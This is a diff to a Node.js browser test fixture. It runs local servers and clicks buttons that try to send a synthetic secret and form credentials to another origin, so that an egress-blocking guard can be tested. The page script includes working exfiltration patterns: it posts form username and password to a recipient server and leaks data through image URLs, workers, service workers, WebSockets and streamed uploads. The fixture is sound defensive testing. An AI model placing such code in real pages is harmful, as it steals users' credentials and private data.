@@ -4,10 +4,13 @@
  * browser-native denial/attempt receipt for the same case in the journey artifact.
  */
 import { createServer } from "node:http";
+import { createServer as createSecureServer } from "node:https";
 import { createHash, randomUUID } from "node:crypto";
 import assert from "node:assert/strict";
 
-export async function createEgressFixture() {
+export async function createEgressFixture({ tls } = {}) {
+  const credential = { username: "aux-egress-fixture", password: `Aux-Disposable-${randomUUID()}!` };
+  let credentialSeeded = false;
   const secret = `aux-private-${randomUUID()}`;
   const captures = [];
   const servers = [];
@@ -16,11 +19,11 @@ export async function createEgressFixture() {
   const cases = new Set([
     "same-origin", "public-recipient", "page-content", "secret-url", "secret-body", "secret-same-origin",
     "secret-header", "secret-cookie", "redirect-secret", "redirect-public", "subresource-secret", "worker-secret",
-    "service-worker-secret", "websocket-protected", "websocket-existing", "webtransport-protected", "webrtc-protected", "recipient-substitution", "cancelled-request", "late-after-cancel",
+    "service-worker-secret", "opaque-upload", "credential-submit", "credential-exfil", "websocket-protected", "websocket-existing", "webtransport-protected", "webrtc-protected", "recipient-substitution", "cancelled-request", "late-after-cancel",
   ]);
   const captureUrl = (role, name, value) => `${origins[role]}/capture?case=${name}${value ? `&value=${encodeURIComponent(value)}` : ""}`;
   for (const role of ["source", "recipient", "substitution"]) {
-    const server = createServer(async (req, res) => {
+    const handler = async (req, res) => {
       const url = new URL(req.url, origins[role]);
       res.setHeader("Access-Control-Allow-Origin", "*");
       res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
@@ -31,14 +34,24 @@ export async function createEgressFixture() {
         const name = url.searchParams.get("case");
         if (!cases.has(name)) { res.writeHead(400).end(); return; }
         let byteCount = 0;
+        let credentialBody = "";
         const digest = createHash("sha256").update(req.url).update(JSON.stringify(req.rawHeaders));
-        for await (const chunk of req) { byteCount += chunk.length; digest.update(chunk); }
+        for await (const chunk of req) { byteCount += chunk.length; digest.update(chunk);
+          if (name === "credential-submit" && byteCount <= 4096) credentialBody += chunk; }
         // Record bounded metadata only. Raw URL/body and synthetic value stay out of evidence.
-        captures.push({ role, case: name, method: req.method, byteCount, digest: digest.digest("hex"), at: Date.now() });
+        captures.push({ role, case: name, method: req.method, byteCount, digest: digest.digest("hex"), at: Date.now(),
+          ...(name === "credential-submit" ? { validCredential: new URLSearchParams(credentialBody).get("password") === credential.password } : {}) });
         res.setHeader("Content-Type", "text/plain");
         res.end("Captured"); return;
       }
       if (role !== "source") { res.writeHead(404).end(); return; }
+      if (url.pathname === "/login-submit" && req.method === "POST") {
+        let body = "";
+        for await (const chunk of req) { body += chunk; if (body.length > 4096) { res.writeHead(413).end(); return; } }
+        const form = new URLSearchParams(body);
+        credentialSeeded = form.get("username") === credential.username && form.get("password") === credential.password;
+        res.writeHead(303, { Location: "/?signed-in=1" }).end(); return;
+      }
       if (url.pathname === "/redirect") {
         const name = url.searchParams.get("case");
         if (!["redirect-secret", "redirect-public", "recipient-substitution"].includes(name)) { res.writeHead(400).end(); return; }
@@ -53,17 +66,21 @@ export async function createEgressFixture() {
           ? `self.addEventListener('install',e=>e.waitUntil(fetch(${JSON.stringify(target)})));`
           : `fetch(${JSON.stringify(target)}).finally(()=>self.close());`); return;
       }
-      if (url.pathname !== "/") { res.writeHead(404).end(); return; }
+      if (!["/", "/login"].includes(url.pathname)) { res.writeHead(404).end(); return; }
       res.setHeader("Content-Type", "text/html; charset=utf-8");
       const buttons = [...cases].map(name => `<button id="${name}" type="button">${name}</button>`).join("\n");
       res.end(`<!doctype html><meta charset="utf-8"><title>EGRESS capture fixture</title>
 <h1>Protected browser request journey</h1><p id="source-prose">The selected meeting schedule must stay under the requested recipient review.</p>
+<form method="post" action="/login-submit"><label>Username <input id="username" name="username" autocomplete="username"></label><label>Password <input id="password" name="password" type="password" autocomplete="current-password"></label><button type="submit">Sign in</button></form>
 ${buttons}<output id="attempt"></output><script>
 const secret=${JSON.stringify(secret)}, origins=${JSON.stringify(origins)};
 const url=(role,name,value)=>origins[role]+'/capture?case='+name+(value?'&value='+encodeURIComponent(value):'');
 const attempt=document.getElementById('attempt');
 const send=(target,body)=>fetch(target,body?{method:'POST',body}:{}).catch(()=>{});
 const actions={
+ 'credential-submit':()=>send(url('source','credential-submit'),new URLSearchParams(new FormData(document.querySelector('form'))).toString()),
+ 'credential-exfil':()=>send(url('recipient','credential-exfil'),new URLSearchParams(new FormData(document.querySelector('form'))).toString()),
+ 'opaque-upload':()=>{try{fetch(url('source','opaque-upload'),{method:'POST',duplex:'half',body:new ReadableStream({start(c){c.enqueue(new TextEncoder().encode(secret));c.close();}})}).catch(()=>{});}catch{}},
  'same-origin':()=>send(url('source','same-origin'),'public query'),
  'public-recipient':()=>send(url('recipient','public-recipient'),'public query'),
  'page-content':()=>send(url('recipient','page-content'),document.getElementById('source-prose').textContent),
@@ -78,16 +95,17 @@ const actions={
  'subresource-secret':()=>{const image=new Image();image.src=url('recipient','subresource-secret',secret);document.body.append(image);},
  'worker-secret':()=>new Worker('/worker.js'),
  'service-worker-secret':()=>navigator.serviceWorker.register('/service-worker.js').catch(()=>{}),
- 'websocket-protected':()=>{const socket=new WebSocket(url('recipient','websocket-protected',secret).replace('http:','ws:'));socket.onerror=()=>{};},
- 'websocket-existing':()=>{window.existingSocket=new WebSocket(url('source','websocket-existing').replace('http:','ws:'));window.existingSocket.onerror=()=>{};},
+ 'websocket-protected':()=>{const socket=new WebSocket(url('recipient','websocket-protected',secret).replace(/^http/,'ws'));socket.onerror=()=>{};},
+ 'websocket-existing':()=>{window.existingSocket=new WebSocket(url('source','websocket-existing').replace(/^http/,'ws'));window.existingSocket.onerror=()=>{};},
  'webtransport-protected':()=>{try{const transport=new WebTransport(url('recipient','webtransport-protected',secret).replace('http:','https:'));transport.ready.catch(()=>{});transport.closed.catch(()=>{});}catch{}},
  'webrtc-protected':async()=>{try{window.egressPeer=new RTCPeerConnection({iceServers:[]});window.egressPeer.createDataChannel('protected');await window.egressPeer.setLocalDescription(await window.egressPeer.createOffer());}catch{}},
- 'cancelled-request':()=>send(url('recipient','cancelled-request'),'public query'),
+ 'cancelled-request':()=>{send(url('recipient','cancelled-request'),'public query');setTimeout(()=>send(url('recipient','late-after-cancel',secret)),1000);},
  'late-after-cancel':()=>setTimeout(()=>send(url('recipient','late-after-cancel',secret)),500),
 };
-for(const [name,run] of Object.entries(actions))document.getElementById(name).onclick=()=>{attempt.textContent=name;run();};
+for(const [name,run] of Object.entries(actions))document.getElementById(name).onclick=()=>{attempt.textContent="Attempted case: "+name;run();};
 </script>`);
-    });
+    };
+    const server = tls ? createSecureServer(tls, handler) : createServer(handler);
     server.on("upgrade", (req, socket) => {
       const url = new URL(req.url, origins[role]);
       const name = url.searchParams.get("case");
@@ -106,11 +124,11 @@ for(const [name,run] of Object.entries(actions))document.getElementById(name).on
     });
     await new Promise((resolve, reject) => { server.once("error", reject); server.listen(0, "127.0.0.1", resolve); });
     const address = server.address();
-    origins[role] = `http://127.0.0.1:${address.port}`;
+    origins[role] = `${tls ? "https" : "http"}://127.0.0.1:${address.port}`;
     servers.push(server);
   }
   return {
-    url: `${origins.source}/`, origins, secret,
+    url: `${origins.source}/`, origins, secret, credential, credentialSeeded: () => credentialSeeded,
     snapshot: () => captures.map(record => ({ ...record })),
     count: name => captures.filter(record => record.case === name).length,
     assertNoCapture(name) { assert.equal(captures.filter(record => record.case === name).length, 0, `Unexpected transmitted request for ${name}`); },
